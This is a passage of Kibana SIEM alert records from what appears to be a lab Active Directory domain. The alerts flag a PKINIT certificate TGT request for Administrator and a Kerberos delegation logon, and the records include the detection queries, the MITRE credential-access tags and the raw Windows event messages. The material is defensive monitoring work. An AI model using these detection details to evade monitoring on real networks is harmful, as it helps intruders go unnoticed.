    "kibana.alert.rule.revision": [
      0
    ],
    "signal.rule.version": [
      "1"
    ],
    "winlog.event_data.ServiceSid": [
      "S-1-5-21-3984567624-304424726-3877085034-502"
    ],
    "signal.original_event.kind": [
      "event"
    ],
    "kibana.alert.status": [
      "active"
    ],
    "winlog.event_data.PreAuthType": [
      "16"
    ],
    "kibana.alert.last_detected": [
      "2026-03-31T08:10:54.815Z"
    ],
    "signal.depth": [
      1
    ],
    "winlog.event_data.AccountSupportedEncryptionTypes": [
      "0x27 (DES, RC4, AES-Sk)"
    ],
    "signal.rule.immutable": [
      "false"
    ],
    "winlog.event_data.ClientAdvertizedEncryptionTypes": [
      "\n\t\tAES256-CTS-HMAC-SHA1-96\n\t\tAES128-CTS-HMAC-SHA1-96"
    ],
    "kibana.alert.rule.rule_type_id": [
      "siem.queryRule"
    ],
    "signal.rule.name": [
      "PKINIT Certificate Authentication - Administrator TGT Request"
    ],
    "kibana.alert.original_event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "signal.rule.rule_id": [
      "4eaabb8a-a6e7-4875-8f88-54a7cf1c86c8"
    ],
    "kibana.alert.rule.license": [
      ""
    ],
    "kibana.alert.original_event.kind": [
      "event"
    ],
    "winlog.task": [
      "Kerberos Authentication Service"
    ],
    "winlog.event_data.CertSerialNumber": [
      "62000000133FEEE851E407AAE3000000000013"
    ],
    "kibana.alert.rule.updated_at": [
      "2026-03-31T08:10:53.976Z"
    ],
    "signal.rule.description": [
      "EID 4768 with pre-auth type 16 (PKINIT) for a privileged account. Indicates certificate-based Kerberos authentication — high signal when Administrator has no prior cert auth history."
    ],
    "message": [
      "A Kerberos authentication ticket (TGT) was requested.\n\nAccount Information:\n\tAccount Name:\t\tAdministrator\n\tSupplied Realm Name:\tLAB2019.LOCAL\n\tUser ID:\t\t\tS-1-5-21-3984567624-304424726-3877085034-500\n\tMSDS-SupportedEncryptionTypes:\t0x27 (DES, RC4, AES-Sk)\n\tAvailable Keys:\tAES-SHA1, RC4\n\nService Information:\n\tService Name:\t\tkrbtgt\n\tService ID:\t\tS-1-5-21-3984567624-304424726-3877085034-502\n\tMSDS-SupportedEncryptionTypes:\t0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)\n\tAvailable Keys:\tAES-SHA1, RC4\n\nDomain Controller Information:\n\tMSDS-SupportedEncryptionTypes:\t0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)\n\tAvailable Keys:\tAES-SHA1, RC4\n\nNetwork Information:\n\tClient Address:\t\t::ffff:192.168.1.218\n\tClient Port:\t\t34536\n\tAdvertized Etypes:\t\n\t\tAES256-CTS-HMAC-SHA1-96\n\t\tAES128-CTS-HMAC-SHA1-96\n\nAdditional Information:\n\tTicket Options:\t\t0x40800010\n\tResult Code:\t\t0x0\n\tTicket Encryption Type:\t0x12\n\tSession Encryption Type:\t0x12\n\tPre-Authentication Type:\t16\n\tPre-Authentication EncryptionType:\t0x0\n\nCertificate Information:\n\tCertificate Issuer Name:\t\tlab2019-WIN-JOCP945SK51-CA\n\tCertificate Serial Number:\t62000000133FEEE851E407AAE3000000000013\n\tCertificate Thumbprint:\t\t43DFBAA431E8184B1DA4B97B562A7E5CEFA73DF4\n\nTicket information\n\tResponse ticket hash:\t\tFNQIMOvZRhjAr6ryTDkNkeWj/L8vWj9u9kdlU0M3few=\n\nCertificate information is only provided if a certificate was used for pre-authentication.\n\nPre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120."
    ],
    "winlog.event_id": [
      "4768"
    ],
    "kibana.alert.original_event.outcome": [
      "success"
    ],
    "signal.original_event.action": [
      "Kerberos Authentication Service"
    ],
    "kibana.alert.rule.created_at": [
      "2026-03-31T08:10:53.976Z"
    ],
    "signal.rule.to": [
      "now"
    ],
    "kibana.space_ids": [
      "default"
    ],
    "kibana.alert.rule.execution.type": [
      "scheduled"
    ],
    "kibana.alert.original_time": [
      "2026-03-31T08:07:31.757Z"
    ]
  }
}

{
  "_index": ".internal.alerts-security.alerts-default-000001",
  "_id": "f23bb707ecc90e1bd7af6081c99aa8a1b736ee26f4c0780f98cae424d9b498fd",
  "_score": 1,
  "_source": {
    "kibana.alert.rule.execution.timestamp": "2026-03-31T08:11:18.736Z",
    "kibana.alert.start": "2026-03-31T08:11:18.736Z",
    "kibana.alert.last_detected": "2026-03-31T08:11:18.736Z",
    "kibana.version": "8.19.12",
    "kibana.alert.rule.parameters": {
      "description": "EID 4624, Logon Type 3, Kerberos authentication, Delegation impersonation level from non-DC source IP. High confidence indicator of Kerberos ticket relay to a sensitive service.",
      "risk_score": 73,
      "severity": "high",
      "license": "",
      "meta": {
        "kibana_siem_app_url": "http://localhost:5601/app/security"
      },
      "author": [],
      "false_positives": [],
      "from": "now-6m",
      "rule_id": "064032d5-b788-4ff5-be30-39095bcae1a0",
      "max_signals": 100,
      "risk_score_mapping": [],
      "severity_mapping": [],
      "threat": [],
      "to": "now",
      "references": [],
      "version": 1,
      "exceptions_list": [],
      "immutable": false,
      "rule_source": {
        "type": "internal"
      },
      "related_integrations": [],
      "required_fields": [],
      "setup": "",
      "type": "query",
      "language": "kuery",
      "index": [
        "apm-*-transaction*",
        "auditbeat-*",
        "endgame-*",
        "filebeat-*",
        "logs-*",
        "packetbeat-*",
        "traces-apm*",
        "winlogbeat-*",
        "-*elastic-cloud-logs-*"
      ],
      "query": "winlog.event_id: \"4624\" and winlog.event_data.ImpersonationLevel: \"%%1840\" and winlog.event_data.AuthenticationPackageName: \"Kerberos\" and winlog.event_data.LogonType: \"3\"",
      "filters": []
    },
    "kibana.alert.rule.category": "Custom Query Rule",
    "kibana.alert.rule.consumer": "siem",
    "kibana.alert.rule.execution.uuid": "f1c2266f-51b1-4ff5-813e-16da7835e811",
    "kibana.alert.rule.name": "Kerberos Relay - Delegation Logon from Unexpected Source",
    "kibana.alert.rule.producer": "siem",
    "kibana.alert.rule.revision": 0,
    "kibana.alert.rule.rule_type_id": "siem.queryRule",
    "kibana.alert.rule.uuid": "5ce29052-9c0d-4119-b4c9-178c3b52db98",
    "kibana.space_ids": [
      "default"
    ],
    "kibana.alert.rule.tags": [
      "attack.credential_access attack.lateral_movement attack.t1558 attack.t1550"
    ],
    "@timestamp": "2026-03-31T08:11:18.721Z",
    "ecs": {
      "version": "8.0.0"
    },
    "agent": {
      "version": "8.19.12",
      "ephemeral_id": "42b3d582-4d19-41fd-8c41-e238e1729729",
      "id": "1751edc0-760c-4637-bf88-257c35b4f211",
      "name": "DC01",
      "type": "winlogbeat",
      "hostname": "DC01"
    },
    "event": {
      "action": "Logon",
      "created": "2026-03-31T08:08:07.238Z",
      "code": "4624",
      "provider": "Microsoft-Windows-Security-Auditing",
      "outcome": "success"
    },
    "log": {
      "level": "information"
    },
    "message": "An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nImpersonation Level:\t\tDelegation\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tDC01$\n\tAccount Domain:\t\tLAB2019.LOCAL\n\tLogon ID:\t\t0x1D8F8C\n\tLinked Logon ID:\t\t0x0\n\tNetwork Account Name:\t-\n\tNetwork Account Domain:\t-\n\tLogon GUID:\t\t{40e9d339-00dc-3a86-0ccb-36fdf95a56cd}\n\nProcess Information:\n\tProcess ID:\t\t0x0\n\tProcess Name:\t\t-\n\nNetwork Information:\n\tWorkstation Name:\t-\n\tSource Network Address:\tfe80::addd:81e2:2d02:4091\n\tSource Port:\t\t61450\n\nDetailed Authentication Information:\n\tLogon Process:\t\tKerberos\n\tAuthentication Package:\tKerberos\n\tTransited Services:\t-\n\tPackage Name (NTLM only):\t-\n\tKey Length:\t\t0\n\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\n\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\n\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\n\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\n\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\n\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\n\nThe authentication information fields provide detailed information about this specific logon request.\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\n\t- Transited services indicate which intermediate services have participated in this logon request.\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.",
    "host": {
      "name": "DC01.lab2019.local"
    },
    "winlog": {
      "event_data": {
        "TargetLogonId": "0x1d8f8c",
        "TargetDomainName": "LAB2019.LOCAL",
        "TargetOutboundDomainName": "-",
        "SubjectUserName": "-",
        "ImpersonationLevel": "%%1840",
        "TargetOutboundUserName": "-",
        "LogonType": "3",
        "TargetLinkedLogonId": "0x0",
        "ElevatedToken": "%%1842",
        "WorkstationName": "-",
        "ProcessId": "0x0",
        "RestrictedAdminMode": "-",
        "LogonProcessName": "Kerberos",
        "TransmittedServices": "-",
        "ProcessName": "-",
        "VirtualAccount": "%%1843",
        "SubjectDomainName": "-",
        "TargetUserSid": "S-1-5-18",
        "AuthenticationPackageName": "Kerberos",
        "SubjectLogonId": "0x0",
        "LmPackageName": "-",
        "SubjectUserSid": "S-1-0-0",
        "TargetUserName": "DC01$",
        "LogonGuid": "{40e9d339-00dc-3a86-0ccb-36fdf95a56cd}",
        "KeyLength": "0",
        "IpAddress": "fe80::addd:81e2:2d02:4091",
        "IpPort": "61450"
      },
      "opcode": "Info",
      "channel": "Security",
      "event_id": "4624",
      "record_id": 15255110,
      "process": {
        "pid": 688,
        "thread": {
          "id": 2064
        }
      },
      "activity_id": "{834cac11-c0d9-0001-55ac-4c83d9c0dc01}",
      "api": "wineventlog",
      "provider_name": "Microsoft-Windows-Security-Auditing",
      "task": "Logon",
      "keywords": [
        "Audit Success"
      ],
      "provider_guid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
      "computer_name": "DC01.lab2019.local",
      "version": 2
    },
    "kibana.alert.original_event.action": "Logon",
    "kibana.alert.original_event.created": "2026-03-31T08:08:07.238Z",
    "kibana.alert.original_event.code": "4624",
    "kibana.alert.original_event.kind": "event",
    "kibana.alert.original_event.provider": "Microsoft-Windows-Security-Auditing",
    "kibana.alert.original_event.outcome": "success",
    "event.kind": "signal",
    "kibana.alert.original_time": "2026-03-31T08:08:06.320Z",
    "kibana.alert.ancestors": [
      {
        "id": "uoDvQp0B8MuvJ8LErto9",
        "type": "event",
        "index": ".ds-winlogbeat-8.19.12-2026.03.19-000001",
        "depth": 0
      }
    ],
    "kibana.alert.status": "active",
    "kibana.alert.workflow_status": "open",
    "kibana.alert.depth": 1,
    "kibana.alert.reason": "event on DC01.lab2019.local created high alert Kerberos Relay - Delegation Logon from Unexpected Source.",
    "kibana.alert.severity": "high",
    "kibana.alert.risk_score": 73,
    "kibana.alert.rule.actions": [],
    "kibana.alert.rule.author": [],
    "kibana.alert.rule.created_at": "2026-03-30T20:17:45.491Z",
    "kibana.alert.rule.created_by": "elastic",
    "kibana.alert.rule.description": "EID 4624, Logon Type 3, Kerberos authentication, Delegation impersonation level from non-DC source IP. High confidence indicator of Kerberos ticket relay to a sensitive service.",
    "kibana.alert.rule.enabled": true,
    "kibana.alert.rule.exceptions_list": [],
    "kibana.alert.rule.false_positives": [],
    "kibana.alert.rule.from": "now-6m",
    "kibana.alert.rule.immutable": false,
    "kibana.alert.rule.interval": "5m",
    "kibana.alert.rule.indices": [
      "apm-*-transaction*",
      "auditbeat-*",
      "endgame-*",
      "filebeat-*",
      "logs-*",
      "packetbeat-*",
      "traces-apm*",
      "winlogbeat-*",
      "-*elastic-cloud-logs-*"
    ],
    "kibana.alert.rule.license": "",
    "kibana.alert.rule.max_signals": 100,
    "kibana.alert.rule.references": [],
    "kibana.alert.rule.risk_score_mapping": [],
    "kibana.alert.rule.rule_id": "064032d5-b788-4ff5-be30-39095bcae1a0",
    "kibana.alert.rule.severity_mapping": [],
    "kibana.alert.rule.threat": [],
    "kibana.alert.rule.to": "now",
    "kibana.alert.rule.type": "query",
    "kibana.alert.rule.updated_at": "2026-03-30T20:17:45.491Z",
    "kibana.alert.rule.updated_by": "elastic",
    "kibana.alert.rule.version": 1,
    "kibana.alert.uuid": "f23bb707ecc90e1bd7af6081c99aa8a1b736ee26f4c0780f98cae424d9b498fd",
    "kibana.alert.workflow_tags": [],
    "kibana.alert.workflow_assignee_ids": [],
    "kibana.alert.rule.meta.kibana_siem_app_url": "http://localhost:5601/app/security",
    "kibana.alert.rule.risk_score": 73,
    "kibana.alert.rule.severity": "high",
    "kibana.alert.intended_timestamp": "2026-03-31T08:11:18.721Z",
    "kibana.alert.rule.execution.type": "scheduled"
  },
  "fields": {
    "kibana.alert.severity": [
      "high"
    ],
    "winlog.event_data.AuthenticationPackageName": [
      "Kerberos"
    ],
    "kibana.alert.rule.updated_by": [
      "elastic"
    ],
    "signal.ancestors.depth": [
      0
    ],
    "winlog.event_data.IpAddress": [
      "fe80::addd:81e2:2d02:4091"
    ],
    "kibana.alert.rule.tags": [
      "attack.credential_access attack.lateral_movement attack.t1558 attack.t1550"
    ],
    "signal.original_event.created": [
      "2026-03-31T08:08:07.238Z"
    ],
    "winlog.process.pid": [
      688
    ],
    "kibana.alert.reason.text": [
      "event on DC01.lab2019.local created high alert Kerberos Relay - Delegation Logon from Unexpected Source."
    ],
    "winlog.event_data.KeyLength": [
      "0"
    ],
    "kibana.alert.ancestors.depth": [
      0
    ],
    "signal.rule.enabled": [
      "true"
    ],
    "signal.rule.max_signals": [
      100
    ],
    "kibana.alert.risk_score": [
      73
    ],
    "signal.rule.updated_at": [
      "2026-03-30T20:17:45.491Z"
    ],
    "agent.name": [
      "DC01"
    ],
    "event.outcome": [
      "success"
    ],
    "signal.original_event.code": [
      "4624"
    ],
    "winlog.event_data.RestrictedAdminMode": [
      "-"
    ],
    "winlog.event_data.TargetUserSid": [
      "S-1-5-18"
    ],
    "kibana.alert.rule.interval": [
      "5m"
    ],
    "kibana.alert.rule.type": [
      "query"
    ],
    "agent.hostname": [
      "DC01"
    ],
    "kibana.alert.start": [
      "2026-03-31T08:11:18.736Z"
    ],
    "event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "kibana.alert.rule.immutable": [
      "false"
    ],
    "event.code": [
      "4624"
    ],
    "agent.id": [
      "1751edc0-760c-4637-bf88-257c35b4f211"
    ],
    "winlog.event_data.TransmittedServices": [
      "-"
    ],
    "signal.rule.from": [
      "now-6m"
    ],
    "winlog.event_data.LogonGuid": [
      "{40e9d339-00dc-3a86-0ccb-36fdf95a56cd}"
    ],
    "kibana.alert.rule.enabled": [
      "true"
    ],
    "kibana.alert.rule.version": [
      "1"
    ],
    "kibana.alert.ancestors.type": [
      "event"
    ],
    "winlog.event_data.SubjectUserSid": [
      "S-1-0-0"
    ],
    "winlog.process.thread.id": [
      2064
    ],
    "winlog.event_data.TargetLinkedLogonId": [
      "0x0"
    ],
    "signal.ancestors.index": [
      ".ds-winlogbeat-8.19.12-2026.03.19-000001"
    ],
    "winlog.event_data.ElevatedToken": [
      "%%1842"
    ],
    "signal.original_event.outcome": [
      "success"
    ],
    "winlog.event_data.WorkstationName": [
      "-"
    ],
    "agent.type": [
      "winlogbeat"
    ],
    "winlog.event_data.SubjectLogonId": [
      "0x0"
    ],
    "winlog.event_data.TargetLogonId": [
      "0x1d8f8c"
    ],
    "winlog.api": [
      "wineventlog"
    ],
    "winlog.event_data.ProcessId": [
      "0x0"
    ],
    "winlog.event_data.ImpersonationLevel": [
      "%%1840"
    ],
    "kibana.alert.rule.max_signals": [
      100
    ],
    "kibana.alert.rule.risk_score": [
      73
    ],
    "winlog.event_data.LogonProcessName": [
      "Kerberos"
    ],
    "kibana.alert.rule.consumer": [
      "siem"
    ],
    "kibana.alert.rule.indices": [
      "apm-*-transaction*",
      "auditbeat-*",
      "endgame-*",
      "filebeat-*",
      "logs-*",
      "packetbeat-*",
      "traces-apm*",
      "winlogbeat-*",
      "-*elastic-cloud-logs-*"
    ],
    "kibana.alert.rule.category": [
      "Custom Query Rule"
    ],
    "event.action": [
      "Logon"
    ],
    "@timestamp": [
      "2026-03-31T08:11:18.721Z"
    ],
    "kibana.alert.original_event.action": [
      "Logon"
    ],
    "signal.rule.updated_by": [
      "elastic"
    ],
    "winlog.event_data.LogonType": [
      "3"
    ],
    "winlog.channel": [
      "Security"
    ],
    "kibana.alert.intended_timestamp": [
      "2026-03-31T08:11:18.721Z"
    ],
    "kibana.alert.rule.severity": [
      "high"
    ],
    "winlog.event_data.TargetDomainName": [
      "LAB2019.LOCAL"
    ],
    "winlog.opcode": [
      "Info"
    ],
    "agent.ephemeral_id": [
      "42b3d582-4d19-41fd-8c41-e238e1729729"
    ],
    "kibana.alert.rule.execution.timestamp": [
      "2026-03-31T08:11:18.736Z"
    ],
    "kibana.alert.rule.execution.uuid": [
      "f1c2266f-51b1-4ff5-813e-16da7835e811"
    ],
    "kibana.alert.uuid": [
      "f23bb707ecc90e1bd7af6081c99aa8a1b736ee26f4c0780f98cae424d9b498fd"
    ],
    "winlog.event_data.SubjectDomainName": [
      "-"
    ],
    "kibana.alert.rule.meta.kibana_siem_app_url": [
      "http://localhost:5601/app/security"
    ],
    "kibana.version": [
      "8.19.12"
    ],
    "signal.rule.license": [
      ""
    ],
    "signal.ancestors.type": [
      "event"
    ],
    "kibana.alert.rule.rule_id": [
      "064032d5-b788-4ff5-be30-39095bcae1a0"
    ],
    "signal.rule.type": [
      "query"
    ],
    "kibana.alert.ancestors.id": [
      "uoDvQp0B8MuvJ8LErto9"
    ],
    "kibana.alert.original_event.code": [
      "4624"
    ],
    "winlog.provider_name": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "winlog.provider_guid": [
      "{54849625-5478-4994-a5ba-3e3b0328c30d}"
    ],
    "kibana.alert.rule.description": [
      "EID 4624, Logon Type 3, Kerberos authentication, Delegation impersonation level from non-DC source IP. High confidence indicator of Kerberos ticket relay to a sensitive service."
    ],
    "winlog.computer_name": [
      "DC01.lab2019.local"
    ],
    "kibana.alert.rule.producer": [
      "siem"
    ],
    "kibana.alert.rule.to": [
      "now"
    ],
    "signal.rule.created_by": [
      "elastic"
    ],
    "signal.rule.interval": [
      "5m"
    ],
    "kibana.alert.rule.created_by": [
      "elastic"
    ],
    "signal.rule.id": [
      "5ce29052-9c0d-4119-b4c9-178c3b52db98"
    ],
    "winlog.keywords": [
      "Audit Success"
    ],
    "signal.reason": [
      "event on DC01.lab2019.local created high alert Kerberos Relay - Delegation Logon from Unexpected Source."
    ],
    "signal.rule.risk_score": [
      73
    ],
    "winlog.record_id": [
      15255110
    ],
    "winlog.event_data.VirtualAccount": [
      "%%1843"
    ],
    "kibana.alert.rule.name": [
      "Kerberos Relay - Delegation Logon from Unexpected Source"
    ],
    "log.level": [
      "information"
    ],
    "host.name": [
      "DC01.lab2019.local"
    ],
    "signal.status": [
      "open"
    ],
    "event.kind": [
      "signal"
    ],
    "winlog.activity_id": [
      "{834cac11-c0d9-0001-55ac-4c83d9c0dc01}"
    ],
    "winlog.version": [
      2
    ],
    "signal.rule.created_at": [
      "2026-03-30T20:17:45.491Z"
    ],
    "signal.rule.tags": [
      "attack.credential_access attack.lateral_movement attack.t1558 attack.t1550"
    ],
    "winlog.event_data.TargetUserName": [
      "DC01$"
    ],
    "kibana.alert.workflow_status": [
      "open"
    ],
    "kibana.alert.original_event.created": [
      "2026-03-31T08:08:07.238Z"
    ],
    "kibana.alert.rule.uuid": [
      "5ce29052-9c0d-4119-b4c9-178c3b52db98"
    ],
    "winlog.event_data.IpPort": [
      "61450"
    ],
    "signal.original_event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "kibana.alert.reason": [
      "event on DC01.lab2019.local created high alert Kerberos Relay - Delegation Logon from Unexpected Source."
    ],
    "signal.ancestors.id": [
      "uoDvQp0B8MuvJ8LErto9"
    ],
    "signal.original_time": [
      "2026-03-31T08:08:06.320Z"
    ],
    "ecs.version": [
      "8.0.0"
    ],
    "signal.rule.severity": [
      "high"
    ],
    "kibana.alert.ancestors.index": [
      ".ds-winlogbeat-8.19.12-2026.03.19-000001"
    ],
    "winlog.event_data.LmPackageName": [
      "-"
    ],
    "event.created": [
      "2026-03-31T08:08:07.238Z"
    ],
    "agent.version": [
      "8.19.12"
    ],
    "kibana.alert.depth": [
      1
    ],
    "kibana.alert.rule.from": [
      "now-6m"
    ],
    "kibana.alert.rule.parameters": [
      {
        "severity": "high",
        "max_signals": 100,
        "rule_source": {
          "type": "internal"
        },
        "risk_score": 73,
        "query": "winlog.event_id: \"4624\" and winlog.event_data.ImpersonationLevel: \"%%1840\" and winlog.event_data.AuthenticationPackageName: \"Kerberos\" and winlog.event_data.LogonType: \"3\"",
        "description": "EID 4624, Logon Type 3, Kerberos authentication, Delegation impersonation level from non-DC source IP. High confidence indicator of Kerberos ticket relay to a sensitive service.",
        "index": [
          "apm-*-transaction*",
          "auditbeat-*",
          "endgame-*",
          "filebeat-*",
          "logs-*",
          "packetbeat-*",
          "traces-apm*",
          "winlogbeat-*",
          "-*elastic-cloud-logs-*"
        ],
        "language": "kuery",
        "type": "query",
        "version": 1,
        "rule_id": "064032d5-b788-4ff5-be30-39095bcae1a0",
        "license": "",
        "immutable": false,
        "meta": {
          "kibana_siem_app_url": "http://localhost:5601/app/security"
        },
        "setup": "",
        "from": "now-6m",
        "to": "now"
      }
    ],
    "kibana.alert.rule.revision": [
      0
    ],
    "signal.rule.version": [
      "1"
    ],
    "signal.original_event.kind": [
      "event"
    ],
    "kibana.alert.status": [
      "active"
    ],
    "kibana.alert.last_detected": [
      "2026-03-31T08:11:18.736Z"
    ],
    "winlog.event_data.TargetOutboundUserName": [
      "-"
    ],
    "signal.depth": [
      1
    ],
    "signal.rule.immutable": [
      "false"
    ],
    "kibana.alert.rule.rule_type_id": [
      "siem.queryRule"
    ],
    "signal.rule.name": [
      "Kerberos Relay - Delegation Logon from Unexpected Source"
    ],
    "kibana.alert.original_event.provider": [
      "Microsoft-Windows-Security-Auditing"
    ],
    "signal.rule.rule_id": [
      "064032d5-b788-4ff5-be30-39095bcae1a0"
    ],
    "kibana.alert.rule.license": [
      ""
    ],
    "kibana.alert.original_event.kind": [
      "event"
    ],
    "winlog.task": [
      "Logon"
    ],
    "kibana.alert.rule.updated_at": [
      "2026-03-30T20:17:45.491Z"
    ],
    "signal.rule.description": [
      "EID 4624, Logon Type 3, Kerberos authentication, Delegation impersonation level from non-DC source IP. High confidence indicator of Kerberos ticket relay to a sensitive service."
    ],
    "winlog.event_data.SubjectUserName": [
      "-"
    ],
    "message": [
      "An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nImpersonation Level:\t\tDelegation\n\nNew Logon:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tDC01$\n\tAccount Domain:\t\tLAB2019.LOCAL\n\tLogon ID:\t\t0x1D8F8C\n\tLinked Logon ID:\t\t0x0\n\tNetwork Account Name:\t-\n\tNetwork Account Domain:\t-\n\tLogon GUID:\t\t{40e9d339-00dc-3a86-0ccb-36fdf95a56cd}\n\nProcess Information:\n\tProcess ID:\t\t0x0\n\tProcess Name:\t\t-\n\nNetwork Information:\n\tWorkstation Name:\t-\n\tSource Network Address:\tfe80::addd:81e2:2d02:4091\n\tSource Port:\t\t61450\n\nDetailed Authentication Information:\n\tLogon Process:\t\tKerberos\n\tAuthentication Package:\tKerberos\n\tTransited Services:\t-\n\tPackage Name (NTLM only):\t-\n\tKey Length:\t\t0\n\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\n\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\n\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\n\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\n\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\n\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\n\nThe authentication information fields provide detailed information about this specific logon request.\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\n\t- Transited services indicate which intermediate services have participated in this logon request.\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
    ],
    "winlog.event_data.TargetOutboundDomainName": [
      "-"
    ],
    "winlog.event_id": [
      "4624"
    ],
    "kibana.alert.original_event.outcome": [
      "success"
    ],
    "signal.original_event.action": [
      "Logon"
    ],
    "kibana.alert.rule.created_at": [
      "2026-03-30T20:17:45.491Z"
    ],
    "signal.rule.to": [
      "now"
    ],
    "kibana.space_ids": [
      "default"
    ],
    "kibana.alert.rule.execution.type": [
      "scheduled"
    ],
    "winlog.event_data.ProcessName": [
      "-"
    ],
    "kibana.alert.original_time": [
      "2026-03-31T08:08:06.320Z"
    ]
  }
}





